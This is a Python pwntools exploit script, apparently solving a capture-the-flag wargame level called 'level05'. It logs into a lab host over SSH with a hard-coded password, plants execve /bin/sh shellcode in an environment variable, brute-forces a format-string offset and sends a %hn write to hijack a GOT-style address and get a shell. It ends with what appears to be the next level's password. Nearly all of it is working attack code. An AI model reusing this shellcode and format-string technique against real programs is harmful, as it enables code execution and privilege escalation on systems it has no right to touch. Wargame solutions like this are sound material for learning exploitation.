#!/usr/bin/env -S python3 -B
#================================ INIT
import pwn
import time

login="level05"
password="3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN"
host="192.168.165.56"
port=42421
s=pwn.ssh(login, host, password=password, port=port)

getenv_src="./utils/getenv.c"
getenv_dst="/tmp/getenv.c"
getenv_gcc="gcc -m32 -z execstack -fno-stack-protector --no-pie"

shellcode="\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"

#================================ RUN
def ft_recv(p, size):
    output=""
    while True:
        try:
            buffer=p.recv(size).decode()
            output+=buffer
            if len(buffer) < size:
                break
        except:
            break
    return output

s.upload(getenv_src, getenv_dst)
p=s.process("/bin/bash")
p.sendline(f"{getenv_gcc} {getenv_dst} -o /tmp/getenv".encode())
time.sleep(0.2)
ft_recv(p, 1024)

p.sendline(f"export SHELLCODE=$(echo -ne '{shellcode}')".encode())
time.sleep(0.2)
ft_recv(p, 1024)

p.sendline(b"/tmp/getenv SHELLCODE")
src_addr=ft_recv(p, 1024).strip()
src_addr=src_addr[2:]
src1=int(src_addr[0:4], 16)
src2=int(src_addr[4:], 16)
src2=src2-8
src1=src1-src2-8
dst_addr="0x080497e0"

offset=1
while True:
    payload=f"abcd %{offset}$x"
    p=s.process("/home/users/level05/level05")
    try:
        p.sendline(payload.encode())
        time.sleep(0.1)
        answer=p.recv().decode()
        if "64636261" in answer:
            break
    except:
        continue
    offset+=1
    p.close()
p.close()

p1=pwn.p32(int(dst_addr, 16)) + pwn.p32(int(dst_addr, 16)+2)
p2=f"%{src2}x%{offset}$hn%{src1}x%{offset+1}$hn"
payload=p1 + p2.encode()
p=s.process("/home/users/level05/level05")
print(f"payload: {payload}")
p.interactive()

# h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
